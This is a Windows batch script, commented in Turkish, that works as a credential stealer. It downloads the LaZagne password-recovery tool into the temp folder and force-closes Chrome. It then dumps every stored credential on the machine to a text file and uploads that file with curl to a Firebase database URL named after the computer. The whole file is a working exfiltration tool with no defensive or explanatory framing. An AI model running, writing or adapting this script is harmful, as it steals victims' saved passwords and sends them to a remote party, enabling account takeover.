@echo off
setlocal enabledelayedexpansion

:: Ayarlar
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: Lazagne.exe varsa indirimi
if exist "%LAZ_EXE%" (
    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
) else (
    echo [INFO] Lazagne indiriliyor...
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
    if errorlevel 1 (
        echo [ERROR] Lazagne indirilemedi!
        pause
        exit /b 1
    )
    echo [OK] Lazagne indirildi.
)

:: Chrome varsa kapat
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if errorlevel 1 (
    echo [INFO] Chrome acik degil.
) else (
    echo [INFO] Chrome calisiyor, kapatiliyor...
    taskkill /IM chrome.exe /F >nul 2>&1
    if errorlevel 1 (
        echo [WARN] Chrome kapatilamadi.
    ) else (
        echo [OK] Chrome kapatildi.
    )
)

:: Sonuc klasoru olustur
if not exist "%RESULT_DIR%" (
    mkdir "%RESULT_DIR%"
    if errorlevel 1 (
        echo [ERROR] Sonuc klasoru olusturulamadi!
        pause
        exit /b 1
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR%

:: LaZagne ile tum credential’lari topla
echo [INFO] LaZagne calistiriliyor...
"%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"
if errorlevel 1 (
    echo [ERROR] LaZagne calistirilirken hata olustu.
    pause
    exit /b 1
)
echo [OK] LaZagne tamamlandi, cikti: %RESULT_DIR%\lazagne_results.txt

:: Sonuclarin Firebase'e yuklenmesi (curl ile)
echo [INFO] Sonuclar Firebase'e yukleniyor...

for %%F in ("%RESULT_DIR%\*") do (
    echo   -> Yukleniyor: %%~nxF
    curl -X PUT -d @%%F "%FIREBASE_URL%/%%~nxF.json" --silent --show-error
    if errorlevel 1 (
        echo [ERROR] %%~nxF yuklenemedi!
        pause
        exit /b 1
    ) else (
        echo [OK] %%~nxF yuklendi.
    )
)

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo ------------------------------------------------------------
echo Cikmak icin bir tusa basin...
pause >nul
exit /b 0
